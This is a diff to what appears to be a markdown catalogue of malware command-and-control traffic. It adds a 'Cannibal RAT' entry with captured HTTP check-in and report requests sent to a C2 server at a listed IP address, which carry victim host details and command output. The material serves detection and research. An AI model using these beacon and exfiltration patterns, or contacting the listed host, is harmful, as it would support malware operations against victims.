@@ -261,6 +261,39 @@ try {"6f7074696f6e73ProcessorId"; $disks = gwmi Win32_Volume -filter "Name='C:\\
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/brushaloader.png "Brushaloader")
 
+#### Cannibal RAT
+~~~
+POST /api/admin_90520735581359/hello HTTP/1.1
+Host: 35.192.197.199:8080
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: python-requests/2.18.4
+Content-Length: 69
+Content-Type: application/json
+
+{"username": "admin", "platform": "Windows 7", "hostname": "User-PC"}
+~~~
+~~~
+POST /api/admin_90520735581359/report HTTP/1.1
+Host: 35.192.197.199:8080
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: python-requests/2.18.4
+Content-Length: 26301
+Content-Type: application/x-www-form-urlencoded
+
+output=%24+%3C%21DOCTYPE+HTML+PUBLIC+%22-%2F%2FW3C%2F%2FDTD+HTML+4.01+Transitional%2F%2FEN%22%0A++%22http%3A%2F%2Fwww.w3.org%2FTR%2Fhtml4%2Floose.dtd%22%3E%0A%3Chtml%3E%0A++%3Chead%3E%0A++++%3Ctitle%3ETypeError%3A+unsupported+operand+type%28s%29+for+%2B%3A+%27NoneType%27+and+%27str%27+%2F%2F+Werkzeug+Debugger%3C%2Ftitle%3E%0A++++%3Clink+rel%3D%22stylesheet%22+href%3D%22%3F__debugger__%3Dyes%26amp%3Bcmd%3Dresource%26amp%3Bf%3Dstyle.css%22%0A++++++++type%3D%22text%2Fcss%22%3E%0A++++%3C%21--+We+need+to+make+sure+this+has+a+favicon+so+that+the+debugger+does%0A+++++++++not+by+accident+trigger+a+request+to+%2Ffavicon.ico+which+might%0A+++++++++change+the+application+state.+--%3E%0A++++%3Clink+rel%3D%22shortcut+icon%22%0A++++++++href%3D%22%3F__debugger__%3Dyes%26amp%3Bcmd%3Dresource%26amp%3Bf%3Dconsole.png%22%3E%0A+++
+
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 0
+Server: Ares
+Date: Thu, 21 Nov 2019 22:54:05 GMT
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/cannibal.png "Cannibal RAT")
+
 #### Coala Bot
 Uses fake 404
 ~~~
